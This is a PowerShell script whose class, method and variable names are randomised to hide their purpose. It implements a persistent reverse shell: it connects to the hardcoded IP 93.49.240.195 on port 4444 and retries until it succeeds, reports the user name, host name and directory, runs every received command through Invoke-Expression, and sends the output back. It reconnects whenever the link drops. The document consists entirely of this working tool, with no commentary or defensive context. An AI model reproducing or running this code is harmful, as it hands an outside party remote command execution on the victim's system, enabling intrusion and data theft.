class CKQsbBwgjAMrlGGgIjFXlpWi {
    
    [string]$GlEQhMiq = "93.49.240.195"
    [int]$yTQMZaTAOetsP = 4444

    $BbhQDqjClYEzAJKwG
    $aEGspcUgqzWtcIhj
    $rjgUL
    $ZnQSwNhRfRCz
    $bzalqtsOZTzlGQFEzq
    $MAJctEnmbebXJvF
    [int]$RZmZP = 50*1024

    LOINPKVNHle() {
        $this.aEGspcUgqzWtcIhj = $false
        while ($true) {
            try {
                $this.aEGspcUgqzWtcIhj = New-Object Net.Sockets.TcpClient($this.GlEQhMiq, $this.yTQMZaTAOetsP)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.BloYxsgUbIjFPcn()
    }

    BloYxsgUbIjFPcn() {
        $this.BbhQDqjClYEzAJKwG = $this.aEGspcUgqzWtcIhj.GetStream()
        $this.ZnQSwNhRfRCz = New-Object Byte[] $this.RZmZP
        $this.MAJctEnmbebXJvF = New-Object Text.UTF8Encoding
        $this.rjgUL = New-Object IO.StreamWriter($this.BbhQDqjClYEzAJKwG, [Text.Encoding]::UTF8, $this.RZmZP)
        $this.bzalqtsOZTzlGQFEzq = New-Object System.IO.StreamReader($this.BbhQDqjClYEzAJKwG)
        $this.rjgUL.AutoFlush = $true
    }

    IxRqspCvAYmkm() {
        $this.LOINPKVNHle()
        $this.azRxxiptp()
    }

    GQNItgIxkykrQgF($uqfLYkhUtqNvOeSOPgYKi) {
        try {
            [byte[]]$pQKMXUYUlhzz = [text.Encoding]::Ascii.GetBytes($uqfLYkhUtqNvOeSOPgYKi)
            $this.rjgUL.Write($pQKMXUYUlhzz, 0, $pQKMXUYUlhzz.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IxRqspCvAYmkm()
        }
    }

    [string] XUpwZYFkVbjs() {
        try {
            $oriAsVYePZ = $this.BbhQDqjClYEzAJKwG.Read($this.ZnQSwNhRfRCz, 0, $this.RZmZP)    
            $xJijAMSWxFJsEsouaVqNUSfF = ($this.MAJctEnmbebXJvF.GetString($this.ZnQSwNhRfRCz, 0, $oriAsVYePZ))
            return $xJijAMSWxFJsEsouaVqNUSfF
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.IxRqspCvAYmkm()
            return ""
        }
    }

    [string] PXCMHejrQyFRvDRaZXn($lBgfiQewGQQTjSPAX) {
        Write-Host $lBgfiQewGQQTjSPAX
        try { 
            $CRyEEpjRLNReIncHQV = Invoke-Expression $lBgfiQewGQQTjSPAX | Out-String
        }
        catch {
            $vttGvbKaPjrfGaYQTXvFhxA = $_.Exception
            $aCNCFQQmpcRHjraomnE = $_.Message
            $CRyEEpjRLNReIncHQV = "`n$_`n"
        }
        return $CRyEEpjRLNReIncHQV
    }

    [string] nUfMwPqjRw() {
        $JteKMCrPgQVlbQ = [Environment]::UserName
        $jizUQbafThoRDnEmP = [System.Net.Dns]::GetHostName()
        $rrZjUWHUXKhJNiUhjkqQYNA = Get-Location
        return "$JteKMCrPgQVlbQ@$jizUQbafThoRDnEmP [$rrZjUWHUXKhJNiUhjkqQYNA]~$ "
    }

    azRxxiptp() {
        while ($this.aEGspcUgqzWtcIhj.Connected) {
            $this.GQNItgIxkykrQgF($this.nUfMwPqjRw())         
            $xJijAMSWxFJsEsouaVqNUSfF = $this.XUpwZYFkVbjs()
            $CRyEEpjRLNReIncHQV = "`n"
            if ([string]::IsNullOrEmpty($xJijAMSWxFJsEsouaVqNUSfF)) {
                continue
            }
            $CRyEEpjRLNReIncHQV = $this.PXCMHejrQyFRvDRaZXn($xJijAMSWxFJsEsouaVqNUSfF)
            $this.GQNItgIxkykrQgF($CRyEEpjRLNReIncHQV + "`n")
            $this.BbhQDqjClYEzAJKwG.Flush()
        }
        $this.aEGspcUgqzWtcIhj.Close()
        $this.IxRqspCvAYmkm()
    } 
}

$yZVaVPoBMMDfrCVCWbIWF = [CKQsbBwgjAMrlGGgIjFXlpWi]::new()
$yZVaVPoBMMDfrCVCWbIWF.IxRqspCvAYmkm()
